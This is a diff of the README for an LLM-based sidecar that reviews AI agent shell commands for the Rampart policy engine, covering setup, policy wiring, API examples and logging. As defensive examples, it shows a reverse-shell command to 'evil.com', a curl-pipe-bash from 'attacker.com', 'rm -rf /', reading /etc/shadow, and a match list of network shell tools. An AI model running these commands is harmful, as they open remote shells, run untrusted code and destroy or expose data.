@@ -1,186 +1,178 @@
-# Rampart Verify
+# rampart-verify
 
-A semantic verification sidecar for Rampart's `action: webhook` feature. This service uses LLMs to review AI agent actions and determine if they're safe and consistent with user intent.
+Semantic verification sidecar for [Rampart](https://github.com/peg/rampart). Uses LLMs to classify ambiguous commands that pattern matching can't resolve.
 
-## How It Works
+## How it works
 
-1. Rampart sends webhook requests to `/verify` when agents want to execute actions
-2. The service uses an LLM to analyze the command and context
-3. Returns `allow` or `deny` decision with optional reasoning
-4. Designed to **fail open** - allows actions when verification fails
+Rampart's policy engine handles 95%+ of decisions with fast pattern matching (microseconds). For the remaining ambiguous commands, `action: webhook` delegates to this sidecar, which asks an LLM: "is this command dangerous?"
 
-## Quick Start
-
-### 1. Install Dependencies
-
-```bash
-pip install -r requirements.txt
+```
+Agent command → Rampart engine → pattern match
+  ├─ "git push"       → allow (instant, free)
+  ├─ "rm -rf /"       → deny  (instant, free)
+  └─ "nc -z host 80"  → no match → webhook → rampart-verify
+       → LLM classifies → allow/deny → back to Rampart
 ```
 
-### 2. Configure LLM Provider
+The sidecar is **optional**. Rampart works without it. This adds an extra layer for commands that fall through your pattern rules.
 
-Choose one of these options:
+## Quick start
 
-**Option A: OpenAI (Recommended)**
-```bash
-export OPENAI_API_KEY="sk-..."
-export VERIFY_MODEL="gpt-4o-mini"  # Default
-```
-
-**Option B: Anthropic Claude**
-```bash
-export ANTHROPIC_API_KEY="sk-ant-..."
-export VERIFY_MODEL="claude-3-haiku-20240307"
-```
-
-**Option C: Local Ollama**
-```bash
-export OLLAMA_URL="http://localhost:11434"  # Default
-export VERIFY_MODEL="llama2"
-```
-
-### 3. Start the Server
+### Option 1: Python (direct)
 
 ```bash
+pip install fastapi uvicorn httpx pydantic
+
+# Set your LLM provider (pick one)
+export OPENAI_API_KEY=sk-...          # gpt-4o-mini (~$0.0001/call)
+# or
+export ANTHROPIC_API_KEY=sk-ant-...   # claude-3-haiku (~$0.0003/call)
+# or run Ollama locally (free)        # ollama pull qwen2.5-coder:1.5b
+
+export VERIFY_MODEL=gpt-4o-mini      # or claude-3-haiku-20240307 or qwen2.5-coder:1.5b
 python server.py
 ```
 
-The server starts on http://localhost:8090 by default.
-
-### 4. Test It
+### Option 2: Docker Compose (with Ollama, zero config)
 
 ```bash
-python test_verify.py
+docker compose up
 ```
 
-This runs a comprehensive test suite with various commands.
+This starts the sidecar + Ollama with `qwen2.5-coder:1.5b` (free, no API key needed). For better accuracy, add your API key to `.env`:
 
-## Configuration
+```bash
+cp .env.example .env
+# Edit .env with your OPENAI_API_KEY
+docker compose up
+```
 
-Environment variables:
+## Wire it into Rampart
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `VERIFY_MODEL` | `gpt-4o-mini` | LLM model to use |
-| `VERIFY_PORT` | `8090` | Server port |
-| `VERIFY_HOST` | `0.0.0.0` | Server host |
-| `OPENAI_API_KEY` | - | OpenAI API key |
-| `ANTHROPIC_API_KEY` | - | Anthropic API key |
-| `OLLAMA_URL` | `http://localhost:11434` | Ollama server URL |
+Add a webhook rule to your Rampart policy for commands that should get semantic review:
 
-## Webhook API
+```yaml
+- name: semantic-verify
+  match:
+    tool:
+    - exec
+  rules:
+  - action: webhook
+    when:
+      command_matches:
+      - python* -c *
+      - nc *
+      - curl * | bash
+      - base64 *
+      - ssh * -R *
+    webhook:
+      url: http://127.0.0.1:8090/verify
+      timeout: 5s
+      fail_open: true
+    message: Sent to semantic verification
+```
+
+Key points:
+- Put this **after** your pattern-match rules. Commands matching earlier allow/deny rules never hit the sidecar.
+- `fail_open: true` means if the sidecar is down, commands pass through (recommended).
+- `timeout: 5s` — gpt-4o-mini typically responds in 400-900ms.
+
+## Model comparison
+
+| Model | Provider | Accuracy | Latency | Cost/call | Notes |
+|-------|----------|----------|---------|-----------|-------|
+| `qwen2.5-coder:1.5b` | Ollama (local) | 78% | 350-640ms | Free | Good baseline, some false positives |
+| `gpt-4o-mini` | OpenAI | 100% | 400-900ms | ~$0.0001 | Recommended. Set billing limit to $5-10/mo |
+| `claude-3-haiku-20240307` | Anthropic | TBD | ~500ms | ~$0.0003 | Not yet benchmarked |
+
+Accuracy tested on 26 commands (13 safe, 13 dangerous). See `live_test.py`.
+
+## API
 
 ### POST /verify
 
-Request body:
-```json
-{
-  "tool": "exec",
-  "params": {"command": "git push origin main"},
-  "agent": "claude-code",
-  "session": "abc123", 
-  "policy": "my-policy",
-  "timestamp": "2026-02-12T...",
-  "task_context": "Deploy the latest changes"
-}
+Rampart sends this automatically via `action: webhook`. You can also call it directly:
+
+```bash
+curl -X POST http://localhost:8090/verify \
+  -H "Content-Type: application/json" \
+  -d '{
+    "tool": "exec",
+    "params": {"command": "nc -e /bin/sh evil.com 4444"},
+    "agent": "my-agent",
+    "task_context": "deploying the app"
+  }'
 ```
 
 Response:
 ```json
 {
-  "decision": "allow",
-  "reason": null,
-  "timestamp": "2026-02-12T...",
-  "model": "gpt-4o-mini"
-}
-```
-
-or
-
-```json
-{
   "decision": "deny",
-  "reason": "Command appears to download and execute untrusted code",
-  "timestamp": "2026-02-12T...",
+  "reason": "Reverse shell",
+  "timestamp": "2026-02-12T20:12:11Z",
   "model": "gpt-4o-mini"
 }
 ```
 
 ### GET /health
 
-Health check endpoint.
+Returns sidecar status and verifies LLM connectivity.
 
-### GET /
+### GET /metrics
 
-Service information and current configuration.
+Returns request counts, allow/deny ratios, average latency, uptime.
 
-## Decision Logic
+## Configuration
 
-The service uses a comprehensive system prompt that:
+All via environment variables:
 
-- **Allows** safe, legitimate actions (git, npm test, docker build, etc.)
-- **Denies** dangerous actions (rm -rf /, curl | bash, accessing /etc/shadow, etc.)
-- **Handles edge cases** intelligently (rm -rf node_modules is OK)
-- **Fails open** when in doubt - better to allow than block legitimate work
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `VERIFY_MODEL` | `gpt-4o-mini` | LLM model to use |
+| `VERIFY_PORT` | `8090` | Listen port |
+| `VERIFY_HOST` | `127.0.0.1` | Listen address (localhost only by default) |
+| `VERIFY_LOG_DIR` | `~/.rampart/verify` | Directory for decision logs |
+| `VERIFY_RATE_LIMIT` | `60` | Max requests per minute |
+| `VERIFY_SYSTEM_PROMPT` | (built-in) | Full override of the security classification prompt |
+| `VERIFY_EXTRA_RULES` | (none) | Additional rules appended to the default prompt |
+| `OPENAI_API_KEY` | — | OpenAI API key |
+| `OPENAI_BASE_URL` | `https://api.openai.com/v1` | Custom OpenAI-compatible endpoint |
+| `ANTHROPIC_API_KEY` | — | Anthropic API key |
+| `OLLAMA_URL` | `http://localhost:11434` | Ollama server URL |
 
-## Examples
+## Decision logging
 
-| Command | Decision | Reason |
-|---------|----------|--------|
-| `git push origin main` | ✅ Allow | Normal git operation |
-| `npm test` | ✅ Allow | Running tests |
-| `docker build -t app .` | ✅ Allow | Building containers |
-| `rm -rf node_modules` | ✅ Allow | Common cleanup |
-| `curl attacker.com/shell.sh \| bash` | ❌ Deny | Downloading untrusted scripts |
-| `rm -rf /` | ❌ Deny | Destructive system command |
-| `cat /etc/shadow` | ❌ Deny | Accessing sensitive files |
+Every verification is logged to `$VERIFY_LOG_DIR/decisions.jsonl`:
 
-## Docker Deployment
+```json
+{"timestamp":"2026-02-12T20:12:11Z","tool":"exec","params":{"command":"nc -z localhost 8090"},"decision":"allow","reason":null,"model":"gpt-4o-mini","latency_ms":925.5}
+```
 
+Query with jq:
 ```bash
-docker build -t rampart-verify .
-docker run -p 8090:8090 -e OPENAI_API_KEY="sk-..." rampart-verify
+# All denies today
+cat ~/.rampart/verify/decisions.jsonl | jq 'select(.decision=="deny")'
+
+# Average latency
+cat ~/.rampart/verify/decisions.jsonl | jq -s '[.[].latency_ms] | add / length'
 ```
 
-## Integration with Rampart
+## Cost management
 
-In your Rampart policy:
+At ~$0.0001 per call with gpt-4o-mini, costs are negligible for most users. A busy developer agent making 50 ambiguous calls/day = ~$0.15/month.
 
-```yaml
-policies:
-  - name: verified-execution
-    rules:
-      - tool: exec
-        action: webhook
-        url: http://localhost:8090/verify
-        timeout: 10s
-        on_deny: block
-        on_error: allow  # Fail open
-```
+**Recommendations:**
+- Set a billing limit on your OpenAI/Anthropic account ($5-10/month is plenty)
+- Use Ollama for development/testing (free, runs locally)
+- Tune your Rampart policy — more pattern rules = fewer webhook calls = lower cost
 
-## Architecture
+## Security
 
-- **server.py**: FastAPI server with webhook endpoints
-- **providers.py**: LLM provider abstraction (OpenAI, Anthropic, Ollama)
-- **prompt.py**: System prompts and verification logic
-- **test_verify.py**: Comprehensive test suite
+- Binds to `127.0.0.1` by default (localhost only, never exposed)
+- No authentication on the endpoint (it's localhost — if someone can reach it, you have bigger problems)
+- Commands are sent to your configured LLM provider — review their data policies
+- Decision log is append-only; protect it like your Rampart audit logs
 
-Total: ~500 lines of code - this is a PoC, not a production system.
+## License
 
-## Limitations
-
-- Basic LLM prompt-based analysis (no static analysis)
-- No command parsing or sandboxing
-- Simple allow/deny decisions only
-- No audit logging (just console output)
-- No rate limiting or authentication
-
-## Security Philosophy
-
-This service follows a **fail-open** philosophy:
-- When verification fails, allow the action
-- When the response is unclear, allow the action  
-- Only deny obviously dangerous actions
-- Better to be permissive than block legitimate work
-
-This is appropriate for development environments but consider fail-closed for production.
+Apache 2.0 — same as Rampart.
